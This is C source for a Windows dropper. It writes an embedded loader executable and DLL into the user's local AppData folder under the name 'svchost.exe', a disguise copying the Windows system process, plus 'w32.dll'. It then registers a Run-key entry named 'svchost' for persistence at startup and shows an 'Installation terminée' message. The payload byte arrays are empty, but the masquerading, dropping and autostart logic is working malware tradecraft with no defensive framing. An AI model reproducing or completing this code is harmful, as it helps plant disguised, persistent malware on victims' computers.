#include <windows.h>
#include <shlobj.h>

#define APP_DIR  ""
#define RUN_KEY  "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RUN_NAME "svchost"

unsigned char loader_exe[] = {
};
unsigned int loader_exe_size = sizeof(loader_exe);

unsigned char mod_dll[] = {
};
unsigned int mod_dll_size = sizeof(mod_dll);

void write_file(const char *path, unsigned char *data, unsigned int size)
{
	HANDLE hFile = CreateFileA(
		path,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD written;
		WriteFile(hFile, data, size, &written, NULL);
		CloseHandle(hFile);
	}
}

void add_to_startup(const char *exe_path)
{
	HKEY hKey;

	if (RegOpenKeyExA(
			HKEY_CURRENT_USER,
			RUN_KEY,
			0,
			KEY_SET_VALUE,
			&hKey) == ERROR_SUCCESS)
	{
		RegSetValueExA(
			hKey,
			RUN_NAME,
			0,
			REG_SZ,
			(BYTE*)exe_path,
			lstrlenA(exe_path) + 1
		);
		RegCloseKey(hKey);
	}
}

int WINAPI WinMain(
	HINSTANCE hInst,
	HINSTANCE hPrev,
	LPSTR lpCmd,
	int nShow)
{
	char appdata[MAX_PATH];
	char install_dir[MAX_PATH];
	char loader_path[MAX_PATH];
	char dll_path[MAX_PATH];

	SHGetFolderPathA(
		NULL,
		CSIDL_LOCAL_APPDATA,
		NULL,
		0,
		appdata
	);

	wsprintfA(install_dir, "%s\\%s", appdata, APP_DIR);
	wsprintfA(loader_path, "%s\\svchost.exe", install_dir);
	wsprintfA(dll_path, "%s\\w32.dll", install_dir);

	CreateDirectoryA(install_dir, NULL);

	write_file(loader_path, loader_exe, loader_exe_size);
	write_file(dll_path, mod_dll, mod_dll_size);

	add_to_startup(loader_path);

	MessageBoxA(
		NULL,
		"Installation terminée",
		"OK",
		MB_OK
	);

	return 0;
}
